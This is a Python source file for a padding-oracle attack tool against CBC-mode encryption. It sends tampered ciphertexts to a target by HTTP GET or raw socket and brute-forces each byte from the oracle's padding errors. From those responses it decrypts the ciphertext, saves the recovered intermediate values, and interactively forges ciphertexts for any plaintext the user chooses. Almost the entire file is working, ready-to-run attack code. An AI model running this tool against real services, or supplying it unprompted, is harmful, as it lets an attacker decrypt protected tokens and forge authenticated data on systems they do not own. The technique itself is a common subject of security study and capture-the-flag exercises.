from utils import *
from math import ceil
import requests
import socket
import os


HEX_BYTES = []

for i in range(256):
    hex_value = f"{i:02X}"
    HEX_BYTES.append(hex_value)


def connect():
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip, port_str = URL.split(':')
        conn.connect((ip, int(port_str)))
        return conn
    except Exception as e:
        log_error(f"Socket connection failed: {e}")
        exit(1)

def socketRequest(payload):
    try:
        CONN.sendall(payload.encode('utf-8'))
        return CONN.recv(1024).decode()
    except Exception as e:
        log_error(f"Error while sending http reqsuest: {e}")
        exit(1)

def postResquest(payload):
    # TODO
    pass

def getRequest(payload):
    try:
        return requests.get(URL+"?"+DATA+payload).text
    except Exception as e:
        log_error(f"Error while sending http reqsuest: {e}")
        exit(1)

def paddingError(response):
    return response.__contains__(PADDING_ERROR)


def getBlocks(cypher):
    blocks = []
    block = ""
    for k in range(len(cypher)):
        if (k+1)%(BLOCK_SIZE*2) == 1 and k != 0:
            blocks.append(block)
            block = ""
        block += cypher[k]
    blocks.append(block)

    return blocks


def modifyBlock(block, val, blocks, ind):
    assert(len(blocks[block]) > ind and len(blocks) > block and ind > 0)
    pre = blocks[block][:ind-1] 
    if len(blocks[block]) > ind+1:
        su = blocks[block][ind+1:]
        res = pre+val+su
    else:
        res = pre+val

    blocks[block] = res


def guess(c, x, pad, Pn, Dn):
    # we have x^d = pad (valid padding)
    # hence d = pad^x
    # and we have c^d = plain
    int_x = int(x, 16)
    int_c = int(c, 16)
    int_d = pad ^ int_x

    Pn[BLOCK_SIZE-pad], Dn[BLOCK_SIZE-pad] = int_c ^ int_d, int_d


def fuzzCk(b, k=0):
    n = len(b)
    pad_step = 1  # always = j+1
    to_print = f"Block: {k+1}\n"
    s = ""
    ok = False
    Pn = [0]*BLOCK_SIZE
    Dn = [0]*BLOCK_SIZE
    SIZE = BLOCK_SIZE*2

    for j in range(SIZE - 1, 0, -2):
        current_val = b[k][j-1:j+1]
        blocks = b.copy()

        # if we are at at least padding 0x02
        for p in range(pad_step-1):
            # we modify d to generate a valid padding
            block_ind = SIZE - 2*p - 1
            valid_padding = Dn[BLOCK_SIZE-p-1] ^ (pad_step)
            modifyBlock(k, f"{valid_padding:02X}", blocks, block_ind)
        
        for val in HEX_BYTES:
            blocks_cpy = blocks.copy()

            # now, d values will generate a valid padding
            # we have to bruteforce the next one to have a valid padding
            modifyBlock(k, val, blocks_cpy, j)
            new_cypher = blockToCypher(blocks_cpy)

            # copy of blocks to have a fancy print
            modifyBlock(k, f"{ORANGE}{val}{WHITE}", bcpy:=blocks_cpy.copy(), j)
            printable_cypher = blockToCypher(bcpy)

            # verify wether or not the oracle validated the padding
            pad_err = paddingError(sendRequest(new_cypher))
            if VERBOSE:
                s = f"Padding Error: {pad_err} | {printable_cypher} | Byte: {BLOCK_SIZE-pad_step+1}\n"
                os.system(CLEAR)
                print(f"{to_print}{s}")
            if not pad_err: # and val != current_val:
                ok = True
                break
        
        to_print += f"{GREEN if ok else RED} Valid padding: {not pad_err} | {new_cypher} | {val if ok else None} | Byte {BLOCK_SIZE-pad_step+1}{WHITE}\n"
        os.system(CLEAR)
        if ok:
            guess(c=current_val, x=val, pad=pad_step, Pn=Pn, Dn=Dn)
            to_print += f"Found d[{BLOCK_SIZE-pad_step+1}]={hex(Dn[BLOCK_SIZE-pad_step])} and p[{BLOCK_SIZE-pad_step+1}]={hex(Pn[BLOCK_SIZE-pad_step])}\n"
        
        print(to_print)

        ok = False
        pad_step += 1   

    return Pn, Dn


def buildBlocks(desired_plain, DNs, n, plain_len):
    # recall that C1^D2 = P2
    # hence if we want C1^D2 = desired_plain
    # we build C1 as C1 = desired_plain^D2
    
    # add padding to the desired plain text to validate the decryption

    blocks = []
    pad_len = BLOCK_SIZE*n - plain_len
    N = BLOCK_SIZE
    block = ""
    for k, Dn in enumerate(DNs):
        if k == n-1:
            N = plain_len-BLOCK_SIZE*k

        for i in range(N):
            block += f"{ord(desired_plain[BLOCK_SIZE*k+i])^Dn[i]:02X}"
        
        if k == n-1:  # if it is le last block, we have to pad the end of it (when the message lenght isn't a multiple of 16)
            for j in range(i+1, i+1+pad_len):
                block += f"{pad_len^Dn[j]:02X}"
        
        blocks.append(block)

    return blocks



if __name__ == "__main__":
    URL, METHOD, DATA, s, BLOCK_SIZE, PADDING_ERROR, VERBOSE = get_args()

    print(ban)
    print("Taille des blocks: ", BLOCK_SIZE)
    print("Cypher sample: ", s)
    print("Blocks: ", b:=getBlocks(s))

    data = None
    saved_data = {
        "DNs": [],
        "PNs": []
    }
 
    if (h:=getFileName(URL, s)) in os.listdir("save"):
        log_success(f"Found saved data with this url and data: save/{h}")
        o = input("Do you want to use saved data ? (y/n) ")
        if o == 'y':
            data = read_data(file_name=h)
    
    message = ""
    sendRequest: callable = None
    CONN: socket.socket = None
    if not data:
        if METHOD == 'GET':
            sendRequest = getRequest

        if METHOD == 'POST':
            print("No implemented yet.")
            exit(1)
        
        if METHOD == 'SOCKET':
            CONN = connect()
            sendRequest = socketRequest

        input("Press enter to attack...")
        CLEAR = 'cls' if os.name == 'nt' else 'clear'
        os.system(CLEAR)

        n = len(b)
        _b = ["00"*16] + b
        try:
            for i in range(0, n):
                sub_b = _b[0:i+2]
                Pn, Dn = fuzzCk(b=sub_b, k=i)
                saved_data["DNs"].append(Dn)
                saved_data["PNs"].append(Pn)
                
                for v in Pn:
                    message += chr(v)

            log_success(f"----------------------- DECRYPTED MESSAGE: {message} -----------------------")
            print("Saving data...")
            save_data(saved_data, URL, s)

        except KeyboardInterrupt:
            if CONN:
                CONN.close()
            print("\nX-X ouch")
            exit(0)

        if CONN:
            CONN.close()
        
    else:
        saved_data = data
        for Pn in saved_data["PNs"]:
            for v in Pn:
                message += chr(v)
        log_success(f"----------------------- DECRYPTED MESSAGE: {message} -----------------------")

    try:
        while True:
            craft = input("Do you want to craft a custom cypher? Enter your plaintext or type '\\q' to quit: ")
            if craft.lower() == "\\q":
                print("Exiting the program.")
                break
            elif craft:
                desired_plain = craft
                plain_len = len(desired_plain)
                n_blocks_needed = ceil(plain_len / BLOCK_SIZE)
                if n_blocks_needed < len(saved_data["DNs"]):
                    C1 = buildBlocks(desired_plain, saved_data["DNs"][:n_blocks_needed], n_blocks_needed, plain_len)
                    C2 = b[n_blocks_needed:n_blocks_needed+1]
                    new_cypher = blockToCypher(C1 + C2)
                    print(f"Crafted Cypher: {new_cypher}")
                else:
                    print("Error: can't craft this message with previous cracked data because it's too long.")
            else:
                print("Please enter a valid plaintext or '\\q' to quit.")

    except KeyboardInterrupt:
        print("\nX-X ouch")
        exit(0)
